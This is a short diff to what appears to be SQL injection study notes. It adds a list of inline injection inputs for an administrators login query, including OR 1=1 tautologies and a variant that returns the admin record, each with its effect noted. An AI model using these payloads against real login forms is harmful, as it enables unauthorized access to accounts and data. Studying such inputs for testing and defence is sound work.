@@ -44,6 +44,13 @@
 
 ### 2. Inline SQL Injection
 
+- SELECT * FROM administrators WHERE
++ username= '' AND password = '' -> Default
++ username = ''' AND password = '' -> Test with single-quote
++ username= '' OR 1=1 AND password = '' -> return record with blank password or username
++ username= '' OR 1 =1 OR (1=1 AND password = '') -> Three conditions, always true, return all
++ username= 'admin' OR (1=1 AND password = '') -> Return only record for username = admin
++ username= '' AND password = '' OR 1=1 -> return all, always true
 
 ### 3. Terminating SQL injection
 
